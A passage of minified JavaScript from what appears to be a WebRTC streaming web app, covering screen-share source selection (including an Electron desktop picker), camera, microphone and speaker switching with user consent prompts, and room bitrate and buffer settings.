new_constraints={audio:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}},video:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}}};0===session.audioDevice&&(new_constraints.audio=!1);try{constraints.video.width.ideal&&(new_constraints.video.mandatory.maxWidth=constraints.video.width.ideal)}catch(e){}try{constraints.video.height.ideal&&(new_constraints.video.mandatory.maxHeight=constraints.video.height.ideal)}catch(e){}try{constraints.video.frameRate.ideal&&(new_constraints.video.mandatory.maxFrameRate=constraints.video.frameRate.ideal)}catch(e){}warnlog("navigator.mediaDevices.getUserMedia starting...");const stream=await window.navigator.mediaDevices.getUserMedia(new_constraints);resolve(stream)}else if(session.screenshare&&!0!==session.screenshare){var sscid=null;const sources=await ipcRenderer.sendSync("getSources",{types:["window"]});for(var i=0;i<sources.length;i++)if(sources[i].name.toLowerCase().startsWith(session.screenshare.toLowerCase())){sscid=i;break}if(null===sscid){sscid=0;for(i=0;i<sources.length;i++)if(sources[i].name.toLowerCase().includes(session.screenshare.toLowerCase())){sscid=i;break}}new_constraints={audio:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}},video:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}}};0===session.audioDevice&&(new_constraints.audio=!1);try{constraints.video.width.ideal&&(new_constraints.video.mandatory.maxWidth=constraints.video.width.ideal)}catch(e){}try{constraints.video.height.ideal&&(new_constraints.video.mandatory.maxHeight=constraints.video.height.ideal)}catch(e){}try{constraints.video.frameRate.ideal&&(new_constraints.video.mandatory.maxFrameRate=constraints.video.frameRate.ideal)}catch(e){}warnlog("navigator.mediaDevices.getUserMedia starting...");const stream=await window.navigator.mediaDevices.getUserMedia(new_constraints);resolve(stream)}else{sscid=0;const sources=await ipcRenderer.sendSync("getSources",{types:["screen"]});new_constraints={audio:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}},video:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:sources[sscid].id}}};0===session.audioDevice&&(new_constraints.audio=!1);try{constraints.video.width.ideal&&(new_constraints.video.mandatory.maxWidth=constraints.video.width.ideal)}catch(e){}try{constraints.video.height.ideal&&(new_constraints.video.mandatory.maxHeight=constraints.video.height.ideal)}catch(e){}try{constraints.video.frameRate.ideal&&(new_constraints.video.mandatory.maxFrameRate=constraints.video.frameRate.ideal)}catch(e){}warnlog(new_constraints),warnlog("navigator.mediaDevices.getUserMedia starting...");const stream=await window.navigator.mediaDevices.getUserMedia(new_constraints);resolve(stream)}else{const sources=await ipcRenderer.sendSync("getSources",{types:["screen","window"]}),selectionElem=document.createElement("div");selectionElem.classList="desktop-capturer-selection",session.screenshareVideoOnly?selectionElem.innerHTML=`\n\t\t\t\t\t\t<div class="desktop-capturer-selection__scroller">\n\t\t\t\t\t\t  <ul class="desktop-capturer-selection__list">\n\t\t\t\t\t\t\t${sources.map((({id:id,name:name,thumbnail:thumbnail,display_id:display_id,appIcon:appIcon})=>`\n\t\t\t\t\t\t\t  <li class="desktop-capturer-selection__item">\n\t\t\t\t\t\t\t\t<button class="desktop-capturer-click desktop-capturer-selection__btn" data-id="${id}" title="${name}">\n\t\t\t\t\t\t\t\t  <img class="desktop-capturer-selection__thumbnail" src="${thumbnail.toDataURL()}" />\n\t\t\t\t\t\t\t\t  <span class="desktop-capturer-selection__name">${name}</span>\n\t\t\t\t\t\t\t\t</button>\n\t\t\t\t\t\t\t  </li>\n\t\t\t\t\t\t\t`)).join("")}\n\t\t\t\t\t\t\t<button id="cancelscreenshare" style="margin: 10px; background-color: #F88; width: 100px;"><i class="las la-window-close" style="font-size:40px;"></i><br />Cancel</button>\n\t\t\t\t\t\t  </ul>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  `:selectionElem.innerHTML=`\n\t\t\t\t\t\t<div class="desktop-capturer-selection__scroller">\n\t\t\t\t\t\t  <ul class="desktop-capturer-selection__list">\n\t\t\t\t\t\t\t${sources.map((({id:id,name:name,thumbnail:thumbnail,display_id:display_id,appIcon:appIcon})=>`\n\t\t\t\t\t\t\t  <li class="desktop-capturer-selection__item">\n\t\t\t\t\t\t\t\t<button class="desktop-capturer-click desktop-capturer-selection__btn" data-id="${id}" title="${name}">\n\t\t\t\t\t\t\t\t  <img class="desktop-capturer-selection__thumbnail" src="${thumbnail.toDataURL()}" />\n\t\t\t\t\t\t\t\t  <span class="desktop-capturer-selection__name">${name}</span>\n\t\t\t\t\t\t\t\t</button>\n\t\t\t\t\t\t\t  </li>\n\t\t\t\t\t\t\t`)).join("")}\n\t\t\t\t\t\t\t<div id="alsoCaptureAudioParent1" style="text-align: center;margin: auto 5px;font-size: 120%;"><i class="las la-music" style="font-size:40px;"></i><br />Include Desktop Audio<br /><input id="alsoCaptureAudio" style="width:20px;height:20px;margin-top: 10px;" type="checkbox" checked></div>\n\t\t\t\t\t\t\t<div id="alsoCaptureAudioParent2" style="text-align: center;margin: auto 5px;font-size: 120%;display:none;"><i class="las la-music" style="font-size:40px;"></i><br />Audio capture not <br />supported on macOS</div>\n\t\t\t\t\t\t\t<button id="captureDesktopAudio" class="desktop-capturer-click" style="margin: 10px;"><i class="las la-music" style="font-size:40px;"></i><br />Capture ONLY<br />Desktop Audio</button>\n\t\t\t\t\t\t\t<button id="cancelscreenshare" style="margin: 10px; background-color: #F88; width: 100px;"><i class="las la-window-close" style="font-size:40px;"></i><br />Cancel</button>\n\t\t\t\t\t\t  </ul>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  `,document.body.appendChild(selectionElem),macOS&&(getById("captureDesktopAudio").style.display="none",getById("alsoCaptureAudio").checked=!1,getById("alsoCaptureAudioParent1").style.display="none",getById("alsoCaptureAudioParent2").style.display="inline-block"),document.getElementById("cancelscreenshare").addEventListener("click",(async()=>{selectionElem.remove(),reject(null)})),document.querySelectorAll(".desktop-capturer-click").forEach((button=>{button.addEventListener("click",(async()=>{try{if("captureDesktopAudio"==button.id){(new_constraints={audio:{mandatory:{chromeMediaSource:"desktop"}},video:{mandatory:{chromeMediaSource:"desktop"}}}).video.mandatory.maxFrameRate=1,warnlog(new_constraints),warnlog("navigator.mediaDevices.getUserMedia starting...");const stream=await window.navigator.mediaDevices.getUserMedia(new_constraints);if(stream.getVideoTracks().length){var track=stream.getVideoTracks()[0];stream.removeTrack(stream.getVideoTracks()[0]),track.stop()}resolve(stream),selectionElem.remove()}else{var audioStream=!1;if(getById("alsoCaptureAudio").checked)if((new_constraints={audio:{mandatory:{chromeMediaSource:"desktop"}},video:{mandatory:{chromeMediaSource:"desktop"}}}).video.mandatory.maxFrameRate=1,warnlog(new_constraints),warnlog("navigator.mediaDevices.getUserMedia starting..."),(audioStream=await window.navigator.mediaDevices.getUserMedia(new_constraints)).getVideoTracks().length){track=audioStream.getVideoTracks()[0];audioStream.removeTrack(audioStream.getVideoTracks()[0]),track.stop()}const id=button.getAttribute("data-id"),source=sources.find((source=>source.id===id));if(!source)throw new Error(`Source with id ${id} does not exist`);var new_constraints={audio:!1,video:{mandatory:{chromeMediaSource:"desktop",chromeMediaSourceId:source.id}}};try{constraints.video.width.ideal&&(new_constraints.video.mandatory.maxWidth=constraints.video.width.ideal)}catch(e){}try{constraints.video.height.ideal&&(new_constraints.video.mandatory.maxHeight=constraints.video.height.ideal)}catch(e){}try{constraints.video.frameRate.ideal&&(new_constraints.video.mandatory.maxFrameRate=constraints.video.frameRate.ideal)}catch(e){}warnlog(new_constraints),warnlog("navigator.mediaDevices.getUserMedia starting...");const stream=await window.navigator.mediaDevices.getUserMedia(new_constraints);audioStream&&audioStream.getAudioTracks().length&&stream.addTrack(audioStream.getAudioTracks()[0]),resolve(stream),selectionElem.remove()}}catch(err){errorlog("Error selecting desktop capture source:",err),reject(err)}}))}))}}catch(err){errorlog("Error displaying desktop capture sources:",err),reject(err)}})),ElectronDesktopCapture=!0}catch(e){warnlog("Couldn't load electron's screen capture. Elevate the app's permission to allow it (right-click?)")}async function grabScreen(quality=0,audio=!0,videoOnEnd=!1){if(!navigator.mediaDevices.getDisplayMedia)return session.cleanOutput||setTimeout((function(){iOS||iPad?warnUser(getTranslation("ios-no-screen-share"),!1,!1):session.mobile?warnUser(getTranslation("android-no-screen-share"),!1,!1):warnUser(getTranslation("no-screen-share-supported"),!1,!1)}),1),!1;if(navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&!ElectronDesktopCapture)return session.cleanOutput||warnUser("Enable Elevated Privileges to allow screen-sharing. (right click this window to see that option)"),!1;var video={};-1==quality||(0==quality?(video.width={ideal:1920},video.height={ideal:1080}):1==quality?(video.width={ideal:1280},video.height={ideal:720}):2==quality?(video.width={ideal:640},video.height={ideal:360}):quality>=3&&(video.width={ideal:320},video.height={ideal:180})),session.width&&(video.width={ideal:session.width}),session.height&&(video.height={ideal:session.height});var constraints={audio:{echoCancellation:!1,autoGainControl:!1,noiseSuppression:!1},video:video};try{let supportedConstraints=navigator.mediaDevices.getSupportedConstraints();supportedConstraints.cursor&&(session.screensharecursor?constraints.video.cursor=["always","motion"]:constraints.video.cursor="never"),session.suppressLocalAudioPlayback&&supportedConstraints.suppressLocalAudioPlayback&&(constraints.audio.suppressLocalAudioPlayback=!0),session.preferCurrentTab&&(constraints.preferCurrentTab=!0),session.selfBrowserSurface&&(constraints.selfBrowserSurface=session.selfBrowserSurface),session.surfaceSwitching&&(constraints.surfaceSwitching=session.surfaceSwitching),session.systemAudio&&(constraints.systemAudio=session.systemAudio),session.displaySurface&&supportedConstraints.displaySurface&&(constraints.video.displaySurface=session.displaySurface)}catch(e){warnlog("navigator.mediaDevices.getSupportedConstraints() not supported")}!0===session.echoCancellation&&(constraints.audio.echoCancellation=!0),!0===session.autoGainControl&&(constraints.audio.autoGainControl=!0),!0===session.noiseSuppression&&(constraints.audio.noiseSuppression=!0),0==audio&&(constraints.audio=!1);var overrideFramerate=!1;!1!==session.frameRate&&0!=session.maxframeRate?(overrideFramerate=session.frameRate,constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}):!1!==session.frameRate?constraints.video.frameRate=session.frameRate:0!=session.maxframeRate?constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}:constraints.video.frameRate={ideal:60},session.screenshareVideoOnly&&(constraints.audio=!1),session.forceAspectRatio&&constraints.video&&!0!==constraints.video&&(constraints.video.aspectRatio={ideal:parseFloat(session.forceAspectRatio)},constraints.video.width&&!session.width?delete constraints.video.width:constraints.video.height&&!session.height&&delete constraints.video.height),!1!==constraints.video&&0==Object.keys(constraints.video).length&&(constraints.video=!0);var wasDisabled=!0;return navigator.mediaDevices.getDisplayMedia(constraints).then((async function(stream){log("adding video tracks 2245");try{var constraint={};session.forceAspectRatio&&null===session.forceScreenShareAspectRatio?constraint.aspectRatio=parseFloat(session.forceAspectRatio):session.forceScreenShareAspectRatio&&(constraint.aspectRatio=parseFloat(session.forceScreenShareAspectRatio)),overrideFramerate&&(constraint.frameRate=overrideFramerate),Object.keys(constraint).length&&(await stream.getVideoTracks()[0].applyConstraints({advanced:[constraint]}),log({advanced:[constraint]}))}catch(e){errorlog(e)}try{session.streamSrc?(session.streamSrc.getVideoTracks().forEach((function(track){beforeScreenShare=track,session.streamSrc.removeTrack(track),wasDisabled=!1,log("stopping video track")})),session.streamSrcClone&&session.streamSrcClone.getVideoTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop()})),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){wasDisabled=!1,session.videoElement.srcObject.removeTrack(track),log("stopping video track 2")})):checkBasicStreamsExist()):checkBasicStreamsExist()}catch(e){warnlog(e)}try{stream.getVideoTracks()[0].onended=function(e){warnlog(e),session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){session.streamSrc.removeTrack(track),track.stop(),log("stopping video track 3"),beforeScreenShare&&beforeScreenShare.id==track.id&&(beforeScreenShare.stop(),beforeScreenShare=null)})),session.streamSrcClone&&session.streamSrcClone.getVideoTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop()})),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){session.videoElement.srcObject.removeTrack(track),track.stop(),log("stopping video track 4")})):session.videoElement.srcObject=outboundAudioPipeline(),screenShareAudioTrack&&(session.streamSrc&&session.streamSrc.getAudioTracks().forEach((function(track){screenShareAudioTrack.id==track.id&&(session.streamSrc.removeTrack(track),track.stop())})),session.streamSrcClone&&session.streamSrcClone.getAudioTracks().forEach((function(track){screenShareAudioTrack.id==track.id&&(session.streamSrcClone.removeTrack(track),track.stop())})),screenShareAudioTrack=null,senderAudioUpdate()),session.screenShareState=!1,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare(),getById("screensharebutton").classList.remove("green"),getById("screensharebutton").ariaPressed="false",1==videoOnEnd&&(beforeScreenShare&&(session.streamSrc.addTrack(beforeScreenShare),beforeScreenShare=null),updateRenderOutpipe(),toggleSettings(!0)),updateMixer()}}catch(e){log("No Video selected; screensharing?")}if(stream.getTracks().forEach((function(track){addScreenDevices(track),session.streamSrc.addTrack(track,stream)})),updateRenderOutpipe(),wasDisabled&&stream.getVideoTracks().length&&!session.videoMuted){var msg={};msg.videoMuted=session.videoMuted,session.sendMessage(msg)}return stream.getAudioTracks().length&&(screenShareAudioTrack=stream.getAudioTracks()[0],senderAudioUpdate()),session.applySoloChat(),session.applyIsolatedChat(),applyMirror(!0),!0})).catch((function(err){if(errorlog(err),errorlog(err.name),"NotAllowedError"==err.name||"PermissionDeniedError"==err.name)macOS&&warnUser(getTranslation("screen-permissions-denied"),!1,!1);else{if(1==audio){if("NotReadableError"==err.name)return session.cleanOutput||warnUser(getTranslation("change-audio-output-device"),!1,!1),!1;setTimeout((function(){grabScreen(quality,!1)}),1)}session.cleanOutput||setTimeout((function(e){errorlog(e)}),1,err)}return!1}))}function toggleBufferSettings(UUID){if(toggle(getById("bufferSettings")),"none"==getById("bufferSettings").style.display)getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove();else{getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove(),zindex=25,getById("bufferSettings").style.zIndex=25;document.body.insertAdjacentHTML("beforeend",'<div id="modalBackdrop" style="z-index:24;background-color:#0000;"></div>'),document.getElementById("modalBackdrop").addEventListener("click",toggleBufferSettings);var buffer=session.rpcs[UUID].buffer;!1===buffer&&(buffer=session.buffer||0),getById("bufferSettings").querySelectorAll("input").forEach((ele=>{ele.value=parseInt(buffer),ele.title=ele.value+" ms",ele.onchange=function(e){session.rpcs[UUID].buffer=parseInt(e.target.value),getById("bufferSettings").querySelectorAll("input").forEach((ele2=>{ele2!==e.target&&(ele2.value=parseInt(e.target.value)),ele2.title=parseInt(e.target.value)+" ms"})),playoutdelay(UUID)},ele.onkeyup=function(e){"Enter"===e.key&&(session.rpcs[UUID].buffer=parseInt(e.target.value),getById("bufferSettings").querySelectorAll("input").forEach((ele2=>{ele2!==e.target&&(ele2.value=parseInt(e.target.value)),ele2.title=parseInt(e.target.value)+" ms"})),playoutdelay(UUID))},ele.oninput=function(e){getById("bufferSettings").querySelectorAll("input").forEach((ele2=>{ele2!==e.target&&(ele2.value=parseInt(e.target.value)),ele2.title=parseInt(e.target.value)+" ms"}))}}))}}function toggleRoomSettings(){if(toggle(getById("roomSettings")),"none"==getById("roomSettings").style.display);else{zindex=25,getById("roomSettings").style.zIndex=25;getById("trbSettingInput").value=session.totalRoomBitrate,getById("trbSettingInputManual").value=session.totalRoomBitrate,getById("trbSettingInputFeedback").innerHTML=session.totalRoomBitrate,!1!==session.limitTotalBitrate&&(getById("ltbSettingInputManual").value=session.limitTotalBitrate,getById("ltbSettingInput").value=session.limitTotalBitrate,getById("ltbSettingInputFeedback").innerHTML=session.limitTotalBitrate||"Disabled")}}function changeLTB(ele){session.limitTotalBitrate=parseInt(ele.value),getById("ltbSettingInputManual").value=session.limitTotalBitrate,getById("ltbSettingInput").value=session.limitTotalBitrate,getById("ltbSettingInputFeedback").innerHTML=session.limitTotalBitrate||"Disabled",pokeIframeAPI("limit-total-bitrate",session.limitTotalBitrate),session.limitTotalBitrateGuests()}function changeTRB(ele){session.totalRoomBitrate=parseInt(ele.value);var msg={directorSettings:{}};msg.directorSettings.totalRoomBitrate=session.totalRoomBitrate,session.sendMessage(msg),pokeIframeAPI("total-room-bitrate",session.totalRoomBitrate)}function sendMediaDevices(UUID){enumerateDevices().then((function(deviceInfos){var data={};data.UUID=UUID,data.mediaDevices=deviceInfos,session.sendMessage(data,data.UUID)}))}function changeVideoDevice(index,quality=0){enumerateDevices().then(gotDevices2).then((function(){activatedPreview=!1,document.getElementById("videoSource3").selectedIndex=index+"",grabVideo(quality,"videosource","#videoSource3")}))}function changeAudioDevice(index){enumerateDevices().then(gotDevices2).then((function(){activatedPreview=!1;for(var audioSelect=document.getElementById("audioSource3").querySelectorAll("input"),i=0;i<audioSelect.length;i++)audioSelect[i].checked=!1;audioSelect[index-1].checked=!0,grabAudio("#audioSource3")}))}function changeVideoDeviceById(deviceId,UUID=!1){enumerateDevices().then(gotDevices2).then((function(){for(var opt,opts=document.getElementById("videoSource3").options,index=!1,j=0;opt=opts[j];j++)if(opt.value==deviceId){index=j;break}!1!==index&&(document.getElementById("videoSource3").selectedIndex===index?(activatedPreview=!1,grabVideo(0,"videosource","#videoSource3",UUID)):UUID&&!session.consent?(window.focus(),confirmAlt("Allow the director to change your video device to:\n\n"+opts[index].text+" ?").then((res=>{if(res)document.getElementById("videoSource3").selectedIndex=index,activatedPreview=!1,grabVideo(0,"videosource","#videoSource3",UUID);else try{var data={};data.UUID=UUID,data.rejected="changeCamera",session.sendMessage(data,data.UUID)}catch(e){}}))):(document.getElementById("videoSource3").selectedIndex=index,activatedPreview=!1,grabVideo(0,"videosource","#videoSource3",UUID)))}))}function changeAudioDeviceById(deviceId,UUID=!1){enumerateDevices().then(gotDevices2).then((function(){for(var audioSelect=document.getElementById("audioSource3").querySelectorAll("input"),matched=!1,exists=!1,i=0;i<audioSelect.length;i++)audioSelect[i].value==deviceId&&(exists=!0,audioSelect[i].checked&&(matched=!0));if(exists)if(matched)activatedPreview=!1,grabAudio("#audioSource3",UUID);else if(UUID&&!session.consent)window.focus(),confirmAlt("Allow the director to change your audio mic source?").then((res=>{if(res){for(var audioSelect=document.getElementById("audioSource3").querySelectorAll("input"),i=0;i<audioSelect.length;i++)audioSelect[i].value==deviceId?audioSelect[i].checked=!0:audioSelect[i].checked=!1;activatedPreview=!1,grabAudio("#audioSource3",UUID)}else try{var data={};data.UUID=UUID,data.rejected="changeMicrophone",session.sendMessage(data,data.UUID)}catch(e){}}));else{for(audioSelect=document.getElementById("audioSource3").querySelectorAll("input"),i=0;i<audioSelect.length;i++)audioSelect[i].value==deviceId?audioSelect[i].checked=!0:audioSelect[i].checked=!1;activatedPreview=!1,grabAudio("#audioSource3",UUID)}}))}function changeAudioOutputDeviceById(deviceId,UUID=!1){warnlog(deviceId),document.getElementById("outputSource3")?enumerateDevices().then(gotDevices2).then((function(){var index=!1;if(document.getElementById("outputSource3"))for(var opt,opts=document.getElementById("outputSource3").options,j=0;opt=opts[j];j++)if(opt.value==deviceId){index=j;break}!1!==index&&(document.getElementById("outputSource3").selectedIndex===index?(session.sink=deviceId,saveSettings(),resetupAudioOut()):UUID&&!session.consent?(window.focus(),confirmAlt("Allow the director to change your audio's speaker to:\n\n"+opts[index].text+" ?").then((res=>{if(res)!1!==index&&(document.getElementById("outputSource3").selectedIndex=index),session.sink=deviceId,saveSettings(),resetupAudioOut(),(data={}).UUID=UUID,sendMediaDevices(data.UUID),session.sendMessage(data,data.UUID);else try{var data;(data={}).UUID=UUID,data.rejected="changeSpeaker",session.sendMessage(data,data.UUID)}catch(e){}}))):(!1!==index&&(document.getElementById("outputSource3").selectedIndex=index),session.sink=deviceId,saveSettings(),resetupAudioOut()))})):(session.sink=deviceId,saveSettings(),resetupAudioOut())}function checkBasicStreamsExist(){return log("checkBasicStreamsExist()"),session.streamSrc||(session.streamSrc=createMediaStream()),session.videoElement||(document.getElementById("videosource")?session.videoElement=document.getElementById("videosource"):document.getElementById("previewWebcam")?session.videoElement=document.getElementById("previewWebcam"):session.videoElement=createVideoElement(),session.videoElement.addEventListener("playing",(e=>{resetupAudioOut(session.videoElement,!0)}),{once:!0}),session.videoElement.onpause=event=>{event.ctrlKey||event.metaKey||(log("Video paused; auto playing"),event.currentTarget.play().then((_=>{log("playing 10")})).catch(warnlog))},session.videoElement.addEventListener("error",(function(event){errorlog("video error"),errorlog(event),setTimeout((function(){session.videoElement&&(log("Trying to re-load local preview, as it may have crashed"),session.videoElement.load())}),1200)}))),session.videoElement.srcObject=outboundAudioPipeline(),toggleMute(!0),session.videoElement}var getUserMediaRequestID=0,grabVideoUserMediaTimeout=null,grabVideoTimer=null;async function grabVideo(quality=0,eleName="previewWebcam",selector="select#videoSourceSelect",callback=!1){if(1!=activatedPreview){if(!session.miconly){activatedPreview=!0,log("Grabbing video: "+quality),grabVideoTimer&&clearTimeout(grabVideoTimer),log("element:"+eleName);var wasDisabled=!0;try{session.streamSrc?(session.canvasWebGL&&(session.canvasWebGL.remove(),session.canvasWebGL=null),session.canvasSource&&session.canvasSource.srcObject.getTracks().forEach((function(trk){session.canvasSource.srcObject.removeTrack(trk),trk.stop(),wasDisabled=!1})),session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){session.streamSrc.removeTrack(track),track.stop(),wasDisabled=!1})),session.streamSrcClone&&session.streamSrcClone.getVideoTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop()}))):(checkBasicStreamsExist(),log("CREATE NEW STREAM")),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){session.videoElement.srcObject.removeTrack(track),track.stop(),session.videoElement.load(),wasDisabled=!1})):checkBasicStreamsExist()}catch(e){errorlog(e)}session.videoElement.controls=session.showControls||!1,log("selector: "+selector);var videoSelect=document.querySelector(selector);log(videoSelect);var mirror=!1;if(getById("cameraTip1").classList.add("hidden"),videoSelect&&"ZZZ"!=videoSelect.value){videoSelect&&videoSelect.value&&(SelectedVideoInputDevices=[videoSelect.value],saveSettings()),session.avatar&&session.avatar.timer&&(clearInterval(session.avatar.timer),session.avatar.timer=null);var sq=0;sq=!1===session.quality?session.quality_wb:session.quality>2?2:session.quality,session.director&&!1!==quality||(!1===quality||quality<sq)&&(quality=sq),(iOS||iPad)&&SafariVersion<15&&0==quality&&(quality=1);var constraints={audio:!1,video:getUserMediaVideoParams(quality,iOS||iPad)};if(log("Quality selected:"+quality),session.facingMode?constraints.video.facingMode={exact:session.facingMode}:iOS||iPad||Firefox?constraints.video.deviceId={exact:videoSelect.value}:videoSelect.options[videoSelect.selectedIndex].text.includes("NDI Video")?constraints.video.deviceId=videoSelect.value:constraints.video.deviceId={exact:videoSelect.value},session.width&&(constraints.video.width={exact:session.width}),session.height&&(constraints.video.height={exact:session.height}),session.frameRate)constraints.video.frameRate={exact:session.frameRate};else if(0!=session.maxframeRate)constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate};else if((iOS||iPad)&&SafariVersion>15)if(1===quality)constraints.video.frameRate||(constraints.video.frameRate={ideal:60,max:60});else if(iPhone12Up&&quality<1&&!constraints.video.frameRate)try{videoSelect.options[videoSelect.selectedIndex].innerText.startsWith("Back ")&&(constraints.video.frameRate={ideal:60,max:60})}catch(e){errorlog(e)}session.ptz&&constraints.video&&!0!==constraints.video&&ChromiumVersion&&ChromiumVersion>80&&(constraints.video.pan=!0,constraints.video.tilt=!0,constraints.video.zoom=!0),session.forceAspectRatio&&constraints.video&&!0!==constraints.video&&(constraints.video.aspectRatio={ideal:parseFloat(session.forceAspectRatio)},constraints.video.width&&!session.width?delete constraints.video.width:constraints.video.height&&!session.height&&delete constraints.video.height);var obscam=!1,mirrorcheck=!1;log(videoSelect.options[videoSelect.selectedIndex].text),videoSelect.options[videoSelect.selectedIndex]?videoSelect.options[videoSelect.selectedIndex].text.startsWith("OBS-Camera")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("OBS Virtual Camera")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("Streamlabs ")?(mirror=!0,obscam=!0):videoSelect.options[videoSelect.selectedIndex].text.startsWith("Dummy video device")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("vMix Video")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("Blackmagic")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("screen-capture-recorder")||videoSelect.options[videoSelect.selectedIndex].text.includes(" back")||videoSelect.options[videoSelect.selectedIndex].text.includes(" rear")||videoSelect.options[videoSelect.selectedIndex].text.includes("NDI Video")||videoSelect.options[videoSelect.selectedIndex].text.startsWith("Back Camera")?mirror=!0:videoSelect.options[videoSelect.selectedIndex].text.toLowerCase().includes("c922")?2===session.quality||session.cleanOutput||(miniTranslate(getById("cameraTipContext1"),"camera-tip-c922"),getById("cameraTip1").classList.remove("hidden")):videoSelect.options[videoSelect.selectedIndex].text.toLowerCase().includes("cam link")?session.cleanOutput||(miniTranslate(getById("cameraTipContext1"),"camera-tip-camlink"),getById("cameraTip1").classList.remove("hidden")):session.mobile?(mirrorcheck=!0,mirror=!1):mirror=!1:session.mobile?(mirrorcheck=!0,mirror=!1):mirror=!1,SamsungASeries&&ChromiumVersion&&(session.cleanOutput||(miniTranslate(getById("cameraTipContext1"),"samsung-a-series"),getById("cameraTip1").classList.remove("hidden"))),session.nomirror?session.mirrorExclude=!0:session.mirrorExclude=mirror,(constraints.video&&!0!==constraints.video&&0==Object.keys(constraints.video).length||constraints.video&&!0!==constraints.video&&1==Object.keys(constraints.video).length&&"deviceId"in constraints.video&&"exact"in constraints.video.deviceId&&"default"===constraints.video.deviceId.exact)&&(constraints.video=!0),log(constraints),clearTimeout(grabVideoUserMediaTimeout),getUserMediaRequestID+=1;var delayStart=100;ChromiumVersion>110?delayStart=20:Firefox&&(delayStart=500),grabVideoUserMediaTimeout=setTimeout((function(gumID,callback2){getUserMediaRequestID===gumID&&(warnlog("navigator.mediaDevices.getUserMedia starting..."),navigator.mediaDevices.getUserMedia(constraints).then((function(stream){if(getUserMediaRequestID!==gumID)return warnlog("GET USER MEDIA CALL HAS EXPIRED"),void stream.getTracks().forEach((function(track){stream.removeTrack(track),track.stop(),log("stopping old track")}));if(log("adding video tracks 2412"),stream.getVideoTracks().forEach((async function(track){try{if(mirrorcheck){try{var capabilities=track.getCapabilities()}catch(e){capabilities={}}"facingMode"in capabilities&&"environment"==capabilities.facingMode&&(session.mirrorExclude=!0),"backgroundBlur"in capabilities?(query('#effectSelector option[value="13"]').classList.remove("hidden"),query('#effectSelector option[value="13"]').disabled=null,query('#effectSelector3 option[value="13"]').classList.remove("hidden"),query('#effectSelector3 option[value="13"]').disabled=null):(query('#effectSelector option[value="13"]').disabled=!0,query('#effectSelector3 option[value="13"]').disabled=!0)}}catch(e){}session.streamSrc.addTrack(track);try{track.onended=function(e){warnlog(e),refreshVideoDevice()}}catch(e){errorlog(e)}if(session.whiteBalance)try{await track.applyConstraints({advanced:[{whiteBalanceMode:"manual",colorTemperature:parseInt(session.whiteBalance)}]})}catch(e){errorlog(e)}if(session.exposure)try{await track.applyConstraints({advanced:[{exposureMode:"manual",exposureTime:parseInt(session.exposure)}]})}catch(e){errorlog(e)}if(session.saturation)try{await track.applyConstraints({advanced:[{saturation:parseInt(session.saturation)}]})}catch(e){errorlog(e)}if(session.sharpness)try{await track.applyConstraints({advanced:[{sharpness:parseInt(session.sharpness)}]})}catch(e){errorlog(e)}if(session.contrast)try{await track.applyConstraints({advanced:[{contrast:parseInt(session.contrast)}]})}catch(e){errorlog(e)}if(session.brightness)try{await track.applyConstraints({advanced:[{brightness:parseInt(session.brightness)}]})}catch(e){errorlog(e)}if(session.mobile&&!(iPad||iOS||Firefox))try{applySavedVideoSettings(track)}catch(e){errorlog(e)}})),Firefox&&!FirefoxEnumerated&&session.streamSrc&&session.streamSrc.getTracks().length&&(FirefoxEnumerated=!0,enumerateDevices().then(gotDevices)),updateRenderOutpipe(),wasDisabled&&!session.videoMuted){var msg={};msg.videoMuted=session.videoMuted,session.sendMessage(msg)}applyMirror(session.mirrorExclude),session.videoElement.play().then((()=>{log("play doublecheck completed")})),"previewWebcam"==eleName&&document.getElementById("previewWebcam")?session.autostart?publishWebcam():(log("4620"),document.getElementById("gear_webcam")&&updateStats(obscam),document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.ready="true","true"==document.getElementById("gowebcam").dataset.audioready&&(document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").focus()))):"inline-block"===getById("gear_webcam3").style.display&&updateStats(obscam),grabVideoTimer&&(clearTimeout(grabVideoTimer),"previewWebcam"==eleName&&document.getElementById("previewWebcam")&&(session.videoElement.controls=!0)),getById("popupSelector_constraints_video")&&(getById("popupSelector_constraints_video").innerHTML=""),getById("popupSelector_constraints_audio")&&(getById("popupSelector_constraints_audio").innerHTML=""),getById("popupSelector_constraints_loading")&&(getById("popupSelector_constraints_loading").style.display=""),(iOS||iPad)&&toggleSpeakerMute(!0),"previewWebcam"==eleName||document.getElementById("previewWebcam")||updateMixer(),pokeIframeAPI("local-camera-event");let grabVideoPostTimeoutValue=1e3;(Firefox||session.mobile)&&(grabVideoPostTimeoutValue=2e3),grabVideoTimer=setTimeout((async 